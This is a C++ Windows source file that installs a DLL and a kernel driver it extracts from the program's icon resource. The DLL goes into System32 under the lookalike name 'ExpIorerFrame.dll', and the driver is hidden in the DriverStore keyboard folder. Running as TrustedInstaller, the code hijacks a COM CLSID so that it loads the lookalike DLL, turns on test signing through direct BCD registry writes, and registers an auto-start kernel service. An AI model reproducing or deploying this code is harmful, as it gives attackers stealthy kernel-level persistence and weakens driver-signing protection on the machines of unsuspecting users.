// DriverInstaller.cpp
#include "DriverInstaller.h"
#include "ResourceExtractor.h"
#include "TrustedInstallerExecutor.h"
#include "resource.h"
#include "DebugConfig.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>

// =============================================================================
// DriverStore Path Resolution
// =============================================================================

std::wstring DriverInstaller::GetDriverStorePath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    // Construct base path to DriverStore FileRepository
    std::wstring driverStoreBase = std::wstring(windowsDir) + 
        L"\\System32\\DriverStore\\FileRepository\\";
    
    // Search for avc.inf AMD64 directory pattern
    WIN32_FIND_DATAW findData;
    std::wstring searchPattern = driverStoreBase + L"keyboard.inf_amd64_*";
    HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                FindClose(hFind);
                return driverStoreBase + findData.cFileName;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // Fallback to default directory name if search fails
    return driverStoreBase + L"keyboard.inf_amd64_12ca23d60da30d59";
}

// =============================================================================
// File System Utilities
// =============================================================================

bool DriverInstaller::WriteFileToDisk(const std::wstring& path, 
                                       const std::vector<BYTE>& data) noexcept {
    std::ofstream file(path, std::ios::binary | std::ios::trunc);
    if (!file.is_open()) {
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
    
    return file.good();
}

bool DriverInstaller::CreateDirectoryWithTI(const std::wstring& path) noexcept {
    DWORD attrs = GetFileAttributesW(path.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return true;
    }
    
    // Use TrustedInstaller to create directory with system privileges
    TrustedInstallerExecutor tiExecutor;
    std::wstring createCmd = L"cmd.exe /c mkdir \"" + path + L"\"";
    return tiExecutor.RunAsTrustedInstaller(createCmd, false);
}

// =============================================================================
// Driver Installation - Core Implementation
// =============================================================================

bool DriverInstaller::InstallDriverAndLibrary() noexcept {
    DEBUG_LOG(L"Starting installation...");
    
    // Extract embedded files from executable resources
    auto files = ResourceExtractor::ExtractFilesFromResource(
        GetModuleHandleW(nullptr), IDR_MAINICON
    );
    
    if (files.size() != 2) {
        std::wcerr << L"[DriverInstaller] ERROR: Expected 2 files, got " 
                   << files.size() << std::endl;
        return false;
    }
    
	// Identify extracted files by filename
	ResourceExtractor::ExtractedFile* dllFile = nullptr;
	ResourceExtractor::ExtractedFile* sysFile = nullptr;

	for (auto& f : files) {
		DEBUG_LOG_VERBOSE(L"Extracted: " << f.filename << L" (" << f.data.size() << L" bytes)");
		
		// Use filename contains for flexibility
		if (f.filename.find(L"ExpIorerFrame.dll") != std::wstring::npos) {
			dllFile = &f;
		} else if (f.filename.find(L"kvckbd.sys") != std::wstring::npos) {
			sysFile = &f;
		}
	}
    
    if (!dllFile || !sysFile) {
        std::wcerr << L"[DriverInstaller] ERROR: Missing required files" << std::endl;
        return false;
    }
    
    // Resolve target installation paths
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring driverStorePath = GetDriverStorePath();
    
    std::wstring dllTargetPath = std::wstring(systemDir) + L"\\ExpIorerFrame.dll";
    std::wstring sysTargetPath = driverStorePath + L"\\kvckbd.sys";
    
    DEBUG_LOG(L"Target paths:");
    DEBUG_LOG(L"  DLL: " << dllTargetPath);
    DEBUG_LOG(L"  SYS: " << sysTargetPath);
    
    // Ensure driver store directory exists with TrustedInstaller privileges
    if (!CreateDirectoryWithTI(driverStorePath)) {
        DEBUG_LOG(L"Warning: Could not ensure driver directory exists");
    }
    
    // Write files directly to system locations using TrustedInstaller privileges
    TrustedInstallerExecutor tiExecutor;
    
    DEBUG_LOG(L"Writing DLL directly...");
    bool dllSuccess = tiExecutor.WriteFileAsTrustedInstaller(dllTargetPath, dllFile->data);
    
    DEBUG_LOG(L"Writing SYS directly...");
    bool sysSuccess = tiExecutor.WriteFileAsTrustedInstaller(sysTargetPath, sysFile->data);
    
    bool success = dllSuccess && sysSuccess;
    
    // Verify files were successfully written to target locations
    if (success) {
        DWORD dllAttrs = GetFileAttributesW(dllTargetPath.c_str());
        DWORD sysAttrs = GetFileAttributesW(sysTargetPath.c_str());
        
        bool dllExists = (dllAttrs != INVALID_FILE_ATTRIBUTES);
        bool sysExists = (sysAttrs != INVALID_FILE_ATTRIBUTES);
        
        DEBUG_LOG(L"File verification:");
        DEBUG_LOG(L"  DLL: " << (dllExists ? L"SUCCESS" : L"FAILED"));
        DEBUG_LOG(L"  SYS: " << (sysExists ? L"SUCCESS" : L"FAILED"));
        
        success = dllExists && sysExists;
    }
    
    if (success) {
        DEBUG_LOG(L"Installation completed successfully");
    } else {
        std::wcerr << L"[DriverInstaller] ERROR: Installation failed" << std::endl;
    }
    
    return success;
}

// =============================================================================
// Driver Uninstallation
// =============================================================================

bool DriverInstaller::UninstallDriverAndLibrary() noexcept {
    std::wcout << L"[DriverInstaller] Starting uninstallation..." << std::endl;
    
    // Resolve file paths for deletion
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring driverStorePath = GetDriverStorePath();
    
    std::wstring dllPath = std::wstring(systemDir) + L"\\ExpIorerFrame.dll";
    std::wstring sysPath = driverStorePath + L"\\kvckbd.sys";
    
    // Use TrustedInstaller to delete protected system files via API
    TrustedInstallerExecutor tiExecutor;
    
    DEBUG_LOG(L"Deleting DLL: " << dllPath);
    bool dllSuccess = tiExecutor.DeleteFileAsTrustedInstaller(dllPath);
    
    DEBUG_LOG(L"Deleting SYS: " << sysPath);
    bool sysSuccess = tiExecutor.DeleteFileAsTrustedInstaller(sysPath);
    
    bool success = dllSuccess && sysSuccess;
    
    if (success) {
        std::wcout << L"[DriverInstaller] Uninstallation completed successfully" << std::endl;
    } else {
        std::wcerr << L"[DriverInstaller] WARNING: Uninstallation may be incomplete" << std::endl;
    }
    
    return success;
}

// =============================================================================
// Registry Operations - ExplorerFrame.dll wrapper redirection
// =============================================================================

bool DriverInstaller::InstallRegistryKeys() noexcept {
    DEBUG_LOG(L"Installing registry keys...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Backup original value first
    std::wstring originalValue;
    bool backupSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",  // Default value
        originalValue
    );
    
    if (backupSuccess) {
        DEBUG_LOG(L"Original value: " << originalValue);
    }
    
    // Write new value with typo (I instead of l)
    bool success = tiExecutor.WriteRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",  // Default value
        L"%SystemRoot%\\system32\\ExpIorerFrame.dll"
    );
    
    if (success) {
        DEBUG_LOG(L"Registry key installed successfully");
    } else {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to install registry key" << std::endl;
    }
    
    return success;
}

bool DriverInstaller::UninstallRegistryKeys() noexcept {
    DEBUG_LOG(L"Restoring registry keys...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Restore original ExplorerFrame.dll value
    bool success = tiExecutor.WriteRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",  // Default value
        L"%SystemRoot%\\system32\\ExplorerFrame.dll"
    );
    
    if (success) {
        DEBUG_LOG(L"Registry key restored successfully");
    } else {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to restore registry key" << std::endl;
    }
    
    return success;
}

// =============================================================================
// BCD Test Signing Operations
// =============================================================================

bool DriverInstaller::EnableTestSigning() noexcept {
    DEBUG_LOG(L"Enabling test signing in BCD...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Step 1: Read current boot entry GUID (REG_SZ string)
    std::wstring bootGuid;
    bool readSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\23000003",
        L"Element",
        bootGuid
    );
    
    if (!readSuccess || bootGuid.empty()) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to read current boot entry GUID" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Current boot GUID: " << bootGuid);
    
    // Step 2: Build registry path for testsigning element
    std::wstring testSigningPath = L"BCD00000000\\Objects\\" + bootGuid + L"\\Elements\\16000049";
    
    DEBUG_LOG(L"Test signing path: " << testSigningPath);
    
    // Step 3: Ensure the key exists
    if (!tiExecutor.CreateRegistryKeyAsTrustedInstaller(HKEY_LOCAL_MACHINE, testSigningPath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to create test signing registry key" << std::endl;
        return false;
    }
    
    // Step 4: Write Element value (single byte: 01 = ON)
    std::vector<BYTE> elementData = { 0x01 };
    
    bool writeSuccess = tiExecutor.WriteRegistryBinaryAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        testSigningPath,
        L"Element",
        elementData
    );
    
    if (!writeSuccess) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to enable test signing" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Test signing enabled successfully");
    std::wcout << L"[DriverInstaller] Test signing enabled. Reboot required for changes to take effect." << std::endl;
    
    return true;
}

bool DriverInstaller::DisableTestSigning() noexcept {
    DEBUG_LOG(L"Disabling test signing in BCD...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Step 1: Read current boot entry GUID (REG_SZ string)
    std::wstring bootGuid;
    bool readSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\23000003",
        L"Element",
        bootGuid
    );
    
    if (!readSuccess || bootGuid.empty()) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to read current boot entry GUID" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Current boot GUID: " << bootGuid);
    
    // Step 2: Build path and set testsigning OFF (single byte: 00 = OFF) or better delete this key
    std::wstring testSigningPath = L"BCD00000000\\Objects\\" + bootGuid + L"\\Elements\\16000049";
    
	bool writeSuccess = tiExecutor.DeleteRegistryKeyAsTrustedInstaller(
		HKEY_LOCAL_MACHINE,
		testSigningPath
	);
    
    if (!writeSuccess) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to disable test signing" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Test signing disabled successfully");
    std::wcout << L"[DriverInstaller] Test signing disabled. Reboot required for changes to take effect." << std::endl;
    
    return true;
}

// =============================================================================
// Driver Service Registration (Direct Registry Method)
// =============================================================================

bool DriverInstaller::InstallDriverService() noexcept {
    DEBUG_LOG(L"Registering kvckbd driver service...");
    
    // Step 1: Get driver store path and validate file exists
    std::wstring driverStorePath = GetDriverStorePath();
    std::wstring fullSysPath = driverStorePath + L"\\kvckbd.sys";
    
    DWORD attrs = GetFileAttributesW(fullSysPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        std::wcerr << L"[DriverInstaller] ERROR: kvckbd.sys not found at: " << fullSysPath << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver file verified: " << fullSysPath);
    
    // Step 2: Convert to relative path (System32\DriverStore\...)
    // Extract everything after "C:\Windows\" or "C:\WINDOWS\"
    std::wstring relativePath;
    size_t windowsPos = driverStorePath.find(L"\\Windows\\");
    if (windowsPos == std::wstring::npos) {
        windowsPos = driverStorePath.find(L"\\WINDOWS\\");
    }
    
    if (windowsPos != std::wstring::npos) {
        // Skip "\Windows\" part, get "System32\DriverStore\..."
        relativePath = driverStorePath.substr(windowsPos + 9); // 9 = length of "\Windows\"
    } else {
        // Fallback: use full path if pattern not found
        relativePath = driverStorePath;
    }
    
    relativePath += L"\\kvckbd.sys";
    
    DEBUG_LOG(L"Relative ImagePath: " << relativePath);
    
    // Step 3: Create service registry key
    std::wstring serviceKeyPath = L"SYSTEM\\CurrentControlSet\\Services\\kvckbd";
    
    TrustedInstallerExecutor tiExecutor;
    
    if (!tiExecutor.CreateRegistryKeyAsTrustedInstaller(HKEY_LOCAL_MACHINE, serviceKeyPath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to create service registry key" << std::endl;
        return false;
    }
    
	// Step 4: Write Type (DWORD: 1 = Kernel Driver)
    if (!tiExecutor.WriteRegistryDwordAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"Type", 0x00000001)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write Type value" << std::endl;
        return false;
    }
    
    // Step 5: Write Start (DWORD: 2 = Auto-start)
    if (!tiExecutor.WriteRegistryDwordAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"Start", 0x00000002)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write Start value" << std::endl;
        return false;
    }
    
    // Step 6: Write ErrorControl (DWORD: 1 = Normal)
    if (!tiExecutor.WriteRegistryDwordAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"ErrorControl", 0x00000001)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write ErrorControl value" << std::endl;
        return false;
    }
    
    // Step 7: Write ImagePath (REG_EXPAND_SZ)
    if (!tiExecutor.WriteRegistryValueAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"ImagePath", relativePath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write ImagePath value" << std::endl;
        return false;
    }
    
    // Step 8: Write DisplayName (REG_SZ)
    if (!tiExecutor.WriteRegistryValueAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"DisplayName", L"kvckbd")) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write DisplayName value" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver service registered successfully");
    std::wcout << L"[DriverInstaller] Driver service registered. Reboot required to load driver." << std::endl;
    
    return true;
}

bool DriverInstaller::UninstallDriverService() noexcept {
    DEBUG_LOG(L"Unregistering kvckbd driver service...");
    
    // Step 1: Try to stop the service if running (using Service Control Manager)
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS status;
            
            // Check if service is running
            if (QueryServiceStatus(hService, &status)) {
                if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING) {
                    DEBUG_LOG(L"Stopping kvckbd service...");
                    
                    // Try to stop the service
                    if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
                        DEBUG_LOG(L"Service stop command sent");
                        
                        // Wait up to 5 seconds for service to stop
                        for (int i = 0; i < 10 && status.dwCurrentState != SERVICE_STOPPED; ++i) {
                            Sleep(500);
                            if (!QueryServiceStatus(hService, &status)) {
                                break;
                            }
                        }
                        
                        if (status.dwCurrentState == SERVICE_STOPPED) {
                            DEBUG_LOG(L"Service stopped successfully");
                        } else {
                            std::wcout << L"[DriverInstaller] WARNING: Service did not stop cleanly" << std::endl;
                        }
                    } else {
                        DWORD error = GetLastError();
                        if (error == ERROR_SERVICE_NOT_ACTIVE) {
                            DEBUG_LOG(L"Service already stopped");
                        } else {
                            std::wcout << L"[DriverInstaller] WARNING: Failed to stop service (error: " 
                                      << error << L")" << std::endl;
                        }
                    }
                } else {
                    DEBUG_LOG(L"Service already stopped or stopping");
                }
            }
            
            CloseServiceHandle(hService);
        } else {
            DEBUG_LOG(L"Service not found or not accessible");
        }
        
        CloseServiceHandle(hSCM);
    } else {
        std::wcout << L"[DriverInstaller] WARNING: Could not open Service Control Manager" << std::endl;
    }
    
    // Step 2: Delete the service registry key
    TrustedInstallerExecutor tiExecutor;
    
    std::wstring serviceKeyPath = L"SYSTEM\\CurrentControlSet\\Services\\kvckbd";
    
    bool success = tiExecutor.DeleteRegistryKeyAsTrustedInstaller(HKEY_LOCAL_MACHINE, serviceKeyPath);
    
    if (success) {
        DEBUG_LOG(L"Driver service unregistered successfully");
        std::wcout << L"[DriverInstaller] Driver service unregistered" << std::endl;
    } else {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to delete service registry key" << std::endl;
    }
    
    return success;
}